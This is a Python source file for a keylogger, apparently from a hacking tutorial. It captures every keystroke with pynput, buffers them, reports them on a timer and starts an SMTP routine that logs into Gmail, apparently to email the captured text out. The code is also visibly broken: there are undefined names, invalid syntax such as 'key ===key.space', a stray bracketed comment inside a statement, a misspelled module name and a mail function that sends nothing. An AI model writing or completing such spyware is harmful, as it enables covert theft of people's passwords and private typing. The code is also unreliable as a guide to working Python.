import pynput.keyboard
import threading

class Keylogger:
	
	def __init__(self):
		self.log = ""
		self.interval = time_interval
	
	def append_to_log(self, string):
		self.log = self.log + string
	

	def process_key_press(self, key):
		
		try:
			current_key = str(key.char)
		except AttributeError:
			if key ===key.space:
				current_key = " "
			else:
				current_key = " "+str(key) + " "	
		self.append_to_log(current_key)

	def report(self):
		print(self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report) [Reports evry 5 seconds]
		timer.start()
	def send_mail(email, password, message):
		server = smptlib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
		with keyboard listener:
			self.report()
			keyboard_listener.join()
	